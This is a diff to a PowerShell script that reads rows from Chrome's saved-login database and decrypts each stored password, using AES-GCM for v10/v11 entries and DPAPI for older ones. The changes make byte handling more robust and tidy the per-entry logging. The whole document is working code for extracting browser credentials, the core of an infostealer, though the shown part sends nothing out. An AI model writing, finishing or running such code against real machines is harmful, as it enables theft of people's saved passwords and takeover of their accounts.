@@ -124,54 +124,64 @@ try {
     
     $entryNum = 0
     foreach ($row in $results) {
+        $entryNum++
+        
         try {
-            $entryNum++
             $url = $row.origin_url
             $username = $row.username_value
-            $encPass = [byte[]]$row.password_value
+            
+            # Handle byte array from SQLite - it might come as different types
+            $encPass = $null
+            if ($row.password_value -is [byte[]]) {
+                $encPass = $row.password_value
+            } elseif ($row.password_value -is [System.Data.Linq.Binary]) {
+                $encPass = $row.password_value.ToArray()
+            } else {
+                # Try to convert to byte array
+                $encPass = [byte[]]$row.password_value
+            }
             
             if (-not $encPass -or $encPass.Length -eq 0) {
+                Log "Entry #$entryNum - Empty password data, skipping"
                 continue
             }
             
-            # Log first few bytes to see what we're dealing with
+            # Log first few bytes
             $firstBytes = "$($encPass[0]),$($encPass[1]),$($encPass[2])"
-            Log "Entry #$entryNum - First bytes: $firstBytes, Length: $($encPass.Length)"
+            Log "Entry #$entryNum ($url)"
+            Log "  First bytes: $firstBytes, Length: $($encPass.Length)"
             
             $password = $null
             
-            # Check version byte (v10, v11, etc.)
-            if ($encPass[0] -eq 118) {  # 'v' in ASCII = 118
-                # Version 10+ - AES GCM
-                Log "  -> Using AES-GCM for: $url"
+            # Check version byte
+            if ($encPass[0] -eq 118) {
+                # AES-GCM (v10, v11, etc.)
+                Log "  Detected AES-GCM encryption"
                 
                 try {
                     $nonce = $encPass[3..14]
                     $ciphertext = $encPass[15..($encPass.Length - 17)]
                     $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
                     
-                    Log "  -> Nonce length: $($nonce.Length), Cipher length: $($ciphertext.Length), Tag length: $($tag.Length)"
-                    
-                    # Create AES-GCM cipher
                     $aes = [Security.Cryptography.AesGcm]::new($key)
                     $plaintext = New-Object byte[] $ciphertext.Length
                     
                     $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                     
                     $password = [Text.Encoding]::UTF8.GetString($plaintext)
-                    Log "  -> SUCCESS! Decrypted: $url"
+                    Log "  SUCCESS!"
                 } catch {
-                    Log "  -> AES-GCM FAILED: $($_.Exception.Message)"
+                    Log "  AES-GCM failed: $($_.Exception.Message)"
                 }
             } else {
-                # Old DPAPI method (Chrome before v80)
-                Log "  -> Using DPAPI for: $url"
+                # Old DPAPI
+                Log "  Detected DPAPI encryption (byte: $($encPass[0]))"
                 try {
                     $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
                     $password = [Text.Encoding]::UTF8.GetString($decrypted)
-                    Log "  -> SUCCESS! Decrypted: $url"
+                    Log "  SUCCESS!"
                 } catch {
-                    Log "  -> DPAPI FAILED: $($_.Exception.Message)"
+                    Log "  DPAPI failed: $($_.Exception.Message)"
                 }
             }
             
@@ -183,7 +193,7 @@ try {
                 }
             }
         } catch {
-            Log "Failed to process entry #$entryNum : $($_.Exception.Message)"
+            Log "Entry #$entryNum processing error: $($_.Exception.Message)"
         }
     }
     
